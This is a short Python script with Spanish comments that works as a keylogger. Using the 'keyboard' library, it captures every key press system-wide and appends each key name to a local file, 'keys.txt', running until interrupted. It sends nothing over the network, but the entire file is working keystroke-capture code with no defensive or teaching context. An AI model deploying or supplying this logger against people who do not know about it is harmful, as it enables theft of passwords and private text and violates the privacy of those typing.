import keyboard
import signal
import sys


def control_function(signal, frame):
    print("\n[!]Saliendo...")
    sys.exit(0) #Codigo de estado de salida

signal.signal(signal.SIGINT, control_function)


log_file = 'keys.txt'

def key_press(press):
    with open(log_file, 'a') as f:
        f.write(f'\n{press.name}')

keyboard.on_press(key_press)
keyboard.wait()


